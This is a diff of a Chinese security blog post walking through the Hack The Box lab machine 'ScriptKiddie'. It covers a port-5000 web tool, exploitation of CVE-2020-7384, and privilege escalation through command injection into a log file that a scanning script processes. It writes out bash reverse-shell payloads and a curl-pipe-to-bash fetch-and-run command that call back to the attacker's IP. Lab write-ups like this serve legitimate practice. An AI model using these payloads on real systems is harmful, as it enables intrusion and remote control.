@@ -21,16 +21,35 @@
   </script>
 
 
-  <meta property="og:type" content="article">
+  <meta name="description" content="查看http 5000端口，中间件是Werkzeug(基于python)。该站点的功能似乎提供了nmap、msfvenom、searchsploit">
+<meta property="og:type" content="article">
 <meta property="og:title" content="HTB:ScriptKiddie">
 <meta property="og:url" content="http://evilarsene.icu/2021/02/08/HTB-ScriptKiddie/index.html">
 <meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="查看http 5000端口，中间件是Werkzeug(基于python)。该站点的功能似乎提供了nmap、msfvenom、searchsploit">
 <meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/ScriptKiddie/16.png">
 <meta property="article:published_time" content="2021-02-08T07:39:10.000Z">
-<meta property="article:modified_time" content="2021-05-07T15:42:47.859Z">
+<meta property="article:modified_time" content="2021-06-15T12:23:12.280Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/ScriptKiddie/1.png">
 
 <link rel="canonical" href="http://evilarsene.icu/2021/02/08/HTB-ScriptKiddie/">
 
@@ -220,7 +239,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-07 23:42:47" itemprop="dateModified" datetime="2021-05-07T23:42:47+08:00">2021-05-07</time>
+                <time title="修改时间：2021-06-15 20:23:12" itemprop="dateModified" datetime="2021-06-15T20:23:12+08:00">2021-06-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -243,18 +262,63 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="b7eb6b87b68e7e702e469ba577162048c8eb993fcc19c9eed8ee61be6e031816">6b83b1484c1bd4d3cb7f0b3881091a917e82162c1010b073de7b97f343becdb3711cf2fb7aff6959fd2e9b5c0d3d367d764be4bc55138d1e7549242a24096e939938285a1e1bf45689a869c0c3ffedf91156a33ca563286439974bd3452882de7553a8f774e6022c8738a070ff57bc422fe9d5e5d379549148b3c32c6aaa757bc72cb897b196e320aae53ca6ba3a06cf608b5121c3c654ef6cbb49fcd841964f2392569f667b57bf324cea45e4012e24875f675d0d3ff6fa91c520ab411e6d7af1e900e31edf61edfdae6e15708cbbc7f32970eb07a38cc07035001d70387114e097b9ae5e86098e047df6b8915934b615b6c73ff00d2ccbb5aa0c964417c03426950c19b80aefcefcac2f926111e5cea1906bcfb8953fab59f4313023fed28da30afb53906c8e0ed0943dbefb86e166d857bcb67a3056a8a909e39fabc08467244f2ab3c1b7a18023c12d40b3bd3ac494109af949b375fde6516a19b1d89c2db3f853435f11504d7f48c8229a09cc365057d8fd15c757ed280dfdb7e2711af191087a2f1562c391850049ab9c3b753ae8e95c1ef56b28abd8f96236e61fca13d9a9de6cb6dc7b25e29eb6b1363dbb8aff5e1e3bc48b691e6777df7d0dd9eb8d18f7682dc976933245d294c6bc866a2dc78602f0f68514fa3ccc72dea77bd33823beab8cd6a3cfd239a6d730a671eda8d5adadc6c53ecd4951c131571a376beeeb62ce422fb862b1367046c1b1ae81773c22c6ea22a803e63cdc1ede0ed915755b5c39b9fc5a6963e9028082f14ebf386753ddd9393fd279ad855f5dcd5bcab3d478166fc0cc1d1a13db91268c7f719dfd2f214a53dffe98b79c2e288aaecde95885f3a27bfb12ef9b41692e91225e127118df8f7539663cb39a073ef719e3b81b2797f94fec54572aa3d8ca4733ffedb12fe29ff1111fadf5d632fdfcb7b338362d7a38a265c06fd2893e53a441c79dcd7d0b78b00d7e4eebe24a2b092923701f998ef3b77f3aefc27360b0d757105665f0a5f5d6de8b29a401c4dbb00df7394050019a42988033bee0863779db369a00b597822497abbab5175284cf9bb2949a499c86cca21dfa11384ba571d94646b7a96729073b49755dd42288491f9f8867b1ea5502609fb76e6f2d4b26aceb13259d521b0f9587e5f966fde32856d852595b8b9a68ad52def85be9aae4b421f93ec6a1124ccd3096b8d2d4baafed08a6633fdfbfeaaa8a8968ab444a92a8bfd8652cd5e76d1c3d6e81e4d4b25466e068ce02c611161e61e6563a49396b9c3ae24af92876ea19d8bf52c0f50a643cd03510e155ca9d44eb35a7658f4202d5441ccb581a4272de52659a8bc0fc8c8639122fd7b52f2653e608f42be7d087239a4179b272906bd8bc86b2efc35eac710b8f44aa67e81fbe3ace74d7bf052b7d61efecec6b56619c2ecce85cb3f7ca1b31cab0b8e8e9ab7ff45539fb0c98d81f148947836fe59e75ef6241bda5cca94a0fafc506f7f6d996a5f8f1bc81f7a911643a6819cc5e966722875d31b904b391798a1d7d5e492869db3f19b2ee0b973392318c6a7ab24cdcef179a376d486025e8e2f6b058b727e7d96deb3a3bb2da9fcb91f017b41f373e338f7bdbfe40f44eabf41f48ea256c65d1b0d859562b8759dce660a0fc3918362f0107e0eeedb233b25fec8fd9fea0b147404e6a99879eab592be03e751de807b872553b339c9ef698f672e8f7e9c1b2105a57bda1660cf4c6d15b1dc7c0ab6839231bec562d4469b6c3e5efe6c2b1c7e703eca71ec7f33075d8a62c31a746be7657aef42c60bdd9f6d2219c437e716a0771f97388c4b61a9b2376163501dee242db87a9920228aa8e4983b78a0f163581560baa2952ce0eab4d196aaa4ea9cb65c296cb6918319a70f3d267ed00efdc28c05c8f480e4fc6d31581358d50c724758c4c6f55d96abd22f6caaf723f61946bacdd06f9cfb8f8ed5f2883ccc094fa6cfed852cd8a2395ae008510512fe92ca3de9f7c80fb1801eb78f00062e617e55a4d94827dccacebf652e85ed362d6d7c419b53311daf448889ffc4e0996cc2bef14d59b9b0026b0c9b443b89a838f8cb296240a9c112748bb3d425a6a60b9a93841ff3ee6dc1751fc98bf46911aecb1814242b7b69fd5fe8ef04be588f2c76d485a3a1bf088df118ebbc4fb5c5186fd35bca0b917f9be89205a9e72b5fdea8a4d27d6afc6fce6ae97013985df0cd28f21520ac6947bab3ed3b376253affa25b9445f3d5ce993f4cb8b325bc824e1ec045ac644ad9571dc785af2da739138913708a31a44c5a4808bb154073a2211ee1ca4afb5ea97dea2307be3197c8d7062b9aedc38dd7f1b528c76cea6e1126d0751ee2bb19c91dc6ec7917e5dc77ac2379aa76911918fa023b031adce2783c102dccaf0662f29afa771b8b68b2146611205e4f5f5c958b2b72c3dd37928f40b1acd7e6c944957aaf154d87151fa48478c9862dbafe0217c0edec20545e74523533d0f5446d7db67a8827a2607abfc49751e8d2bd79335162636165404a627be14a51112305ebd347f9bf5d032a5c0990fbb28de47793ea1056ef8f3f5993a60446db53cb3c3e584fc24448633afb47dad409315bb2589743b0fdb63bab7595bf9f342f8a4a06d776e42fbacfee38437c337007824c53188e64c16623a5d0f9f033b438574df949184951f2692fc522e88ecd5ca3a3c17f1958fea7cc29a65a1996647c37f2bd1cc0e7f6a7d236fb94294085edce6cbc86537fb3a7f9d574a31a0682af5f51a06e5eba7082a024bbcfa2d53ac0cc6e4b20a8bb07005849edd7803a0bae7cbc5aed8e98f7dff58f9e12f718351610ae7d8b6041c6a01cc87f2c0ff2b36d71a0d3fbcd12830b13d037b72888f71b7a68ca17f563ec2839fccb9aa381a54f670d76d8fd0f0cfc3ae3328ed84043c3ca63f7a6821b71e3d7e82d69a996d768c098358308302e49b6d4dbcd8f2cca24e676c1e15e88fb346514222b176441ea91d318227cf318666f1cf5a3fb09303fda9d7f78cd6e7eadf9b64aa572c180c53feab49f52130fa307eaf028cf7660e8933ce0b89b24934a8f8ea7ad136dd2f2f493b0f0653504deb021ad5165957b2a1de7d01bfcdd8d0cfdd505d93545a7bd853bc3d49d30d39d731de5c590e96d919473870a22520351086228312bbd84f1592fdfefac18d14c97f9732a80f934ae002f774eccee78644facb880bab38b3f2be9238ed48cab7235d8582bbd0916a571aae12a27c1ab0cece6619b664b34dcd8cc39e46696a52b43f712a587a86ea4b9bd92cdc38f642e9c49490182969b1d59c660a4a28c71a723380b141dc3f2f4cf189877f401e966bfe262d9358bc988ea83d726c97673687d63fe7a5954a182aaaeb8f5fc7e0068f669573a41ffa165f985dc1eeb3561dda1ffeea5ae098035181ae0317f65d9aae9e293c43c609f907f61fda301c77e38b8cf52a49d5c05c12e81d4c556c1eba3a2b2261496843e3a6062675efa7b728614a723beb82ba8c61600c23e0c552437346e2204b6cd9660d25902bc384e67b67debf1b4aa3d72cf6e957ebfdeaa9992ebf843c4728bc7e3c60c5a2a1ad2938cbb8cd499106459435f530932dd78b34d8f920006d2a63a4d082c4d4134b15c2de54259c2eeab0a22928af2ec7dfb5fe36b582b84be8315db3bf9f3709f5c9cca9bcacb4a405beccf6180713ba2e9ee48c9564239a02bb5839bd4400244824144177d7c212d1270ca6d0db6e54ae98329fc4ef9cf944ebca1fefc1eb02daccfa3243629f698b4ca7854103ca0e8e1b8c9b605b35ed677df280c827f9650a5f27ed0dfdd1b1666abaa03b1b593ba4e91910845e2b6b546cfb27a7903d100c4c8359c41842f923b32aecbc9c8ae1b0394029b1c2ac9f25b95623ddd3d0ee9eaccf9bbd2485cfb9a1047d8caf0d4a08f71f34605e36fff518c74a505e9cba3063dcd0fb9a9ce6e05a988c8f3bfaf27b2cd8a4f292675902533163b90594f428f17728a8a8beda6a9703cd4346edaf43a60e8661e5e5879d96456b46a5936eb4a4a79f768674352d09386f2b9bda2db19b19fcb6dc89a82b8765520fc409fd2824f74f10bbd4cb7c473de29f733b576805097067b02b0dbb329bd1cef23da8d581ffc77635c44eaf6351e70d5c3a73ea6977cde40aee461b90890af00549eb9f5e6d3ca176c14ea8c9b52695290465339fe263a57932fa0b3fb10296f7f53f93c9303600b21936d390c6f56cdb562e3b9a5f13a000b4949bb0a8f3ec890ac9e79306a3dbb276698b43fbf7afaf9b15a74293651579368103c5353bd3e230722339dbed51f99e0a5b32c3b040ca76fd30276e0816cb915ff0083f75bca208443cf13ca2e5d79175c5b97a73b4403565d493efe52fb563348c347b660fd5681cb799a147bcd0a706e2718878d427940f901400f48f3eaccf4f995d4875b04d2a76c0b2bcfbce032817b11e58920cc6c860b8d531c08d2a003319538d75f229d799aaf8f09b9ddc64d3a9111c8020e9b772f06c3d1535f7024355f8235856029e6882acb99f05dd9b33611f662d9fd6d53e0bd7a0eab2a31e496ed9ddb1c945c71efd04ae8cdea35b1f0191ae80823b548837411764030e4250fceb273aace4d2463e9275d5bb1bad5c8ef9d29e1a1dad0a345ac</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">尚未退休root hash($6...V0)</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+        <h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/ScriptKiddie/1.png" alt="1"></p>
+<p>查看http 5000端口，中间件是Werkzeug(基于python)。该站点的功能似乎提供了<code>nmap</code>、<code>msfvenom</code>、<code>searchsploit</code></p>
+<p><img src="/images/ScriptKiddie/2.png" alt="2"></p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>尝试通过nmap进行ssrf，没有得到其他信息</p>
+<p><img src="/images/ScriptKiddie/3.png" alt="3"></p>
+<p>尝试命令注入:失败</p>
+<p><img src="/images/ScriptKiddie/4.png" alt="4"></p>
+<h2 id="CVE-2020-7384"><a href="#CVE-2020-7384" class="headerlink" title="CVE-2020-7384"></a>CVE-2020-7384</h2><p>搜索公开漏洞发现<code>msfvenom APK模板注入</code>的命令执行漏洞</p>
+<p><img src="/images/ScriptKiddie/5.png" alt="5"></p>
+<p>修改python脚本的payload部分为反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.2&#x2F;4444 0&gt;&amp;1&quot;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ScriptKiddie/6.png" alt="6"></p>
+<p>命令被base64编码了，不过程序还是会报错。修改payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;curl http://10.10.16.2/shell |bash&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>另外该脚本还调用了<code>jarsigner</code>，需要安装JDK(JRE)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install default-jdk</span><br></pre></td></tr></table></figure>
+
+<p>运行该脚本，得到template文件</p>
+<p><img src="/images/ScriptKiddie/7.png" alt="7"></p>
+<p>上传apk模板，之后就能获得shell</p>
+<p><img src="/images/ScriptKiddie/8.png" alt="8"></p>
+<p>另外，msf也带有现成的模块</p>
+<p><img src="/images/ScriptKiddie/9.png" alt="9"></p>
+<p>也能够获得shell</p>
+<p><img src="/images/ScriptKiddie/10.png" alt="10"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>在<code>/home/kid/html</code>Web目录中发现<code>app.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">regex_alphanum = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^[A-Za-z0-9 \.]+$&#x27;</span>)</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span>                                                                                </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="string">&#x27;action&#x27;</span> <span class="keyword">in</span> request.form:                             </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line">    <span class="keyword">elif</span> request.form[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;scan&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> scan(request.form[<span class="string">&#x27;ip&#x27;</span>])</span><br><span class="line">    <span class="keyword">elif</span> request.form[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;generate&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> venom(request)</span><br><span class="line">    <span class="keyword">elif</span> request.form[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;searchsploit&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> searchsploit(request.form[<span class="string">&#x27;search&#x27;</span>], request.remote_addr)</span><br><span class="line">    print(<span class="string">&quot;no valid action&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> request.form</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchsploit</span>(<span class="params">text, srcip</span>):</span></span><br><span class="line">    <span class="keyword">if</span> regex_alphanum.match(text):</span><br><span class="line">        result = subprocess.check_output([<span class="string">&#x27;searchsploit&#x27;</span>, <span class="string">&#x27;--color&#x27;</span>, text])</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, searchsploit=result.decode(<span class="string">&#x27;UTF-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kid/logs/hackers&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f&#x27;[<span class="subst">&#123;datetime.datetime.now()&#125;</span>] <span class="subst">&#123;srcip&#125;</span>\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, sserror=<span class="string">&quot;stop hacking me - well hack you back&quot;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>它会判断输入是否包含<code>数字字母</code>以及<code>.</code>和<code>空格</code>，如果包含，就把日期和输入这的IP写入到<code>/home/kid/logs/hackers</code> 文件中</p>
+<p>我们可以观察这个文件，并尝试写入不合法的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f &#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers</span><br></pre></td></tr></table></figure>
+
+<p>当写入不合法的数据时，产生数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2021-06-11 07:35:14.418467] 10.10.16.2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ScriptKiddie/11.png" alt="11"></p>
+<p>不过写入的日志信息瞬间就会消失，可能有其他文件也在对其进行循环操作，使用pspy查看进程</p>
+<p>这里先启动pspy，然后从网页上往searchsploit写入不合法的数据，这会触发机器上的<code>incron</code></p>
+<p><img src="/images/ScriptKiddie/12.png" alt="12"></p>
+<p>发现<code>/home/pwn/scanlosers.sh</code>，并且我们具有该文件的读权限</p>
+<p><img src="/images/ScriptKiddie/13.png" alt="13"></p>
+<p>其中前log空格的第三部分会提取出ip地址，存储为变量{ip}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cat log</span><br><span class="line">[2021-06-11 07:35:14.418467] 10.10.16.2</span><br><span class="line">$cat log | cut -d&#39; &#39; -f3- | sort -u</span><br><span class="line">10.10.16.2</span><br></pre></td></tr></table></figure>
+
+<p>之后调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;nmap --top-ports 10 -oN recon&#x2F;$&#123;ip&#125;.nmap $&#123;ip&#125; 2&gt;&amp;1 &gt;&#x2F;dev&#x2F;null&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们具有对<code>/home/kid/logs/hackers</code>的读写权限，所以我们可以对其进行命令注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;junk junk &#96;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.2&#x2F;9999 0&gt;&amp;1&quot;&#96;&#39; &gt; &#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ScriptKiddie/14.png" alt="14"></p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p><img src="/images/ScriptKiddie/15.png" alt="15"></p>
+<p>在msf中我们是直接执行命令的</p>
+<p><img src="/images/ScriptKiddie/16.png" alt="16"></p>
+
     </div>
 
     
@@ -337,6 +401,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.</span> <span class="nav-text">枚举</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-7384"><span class="nav-number">2.1.</span> <span class="nav-text">CVE-2020-7384</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#user"><span class="nav-number">3.1.</span> <span class="nav-text">user</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root"><span class="nav-number">3.2.</span> <span class="nav-text">root</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -352,14 +417,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">169</span>
+          <span class="site-state-item-count">170</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
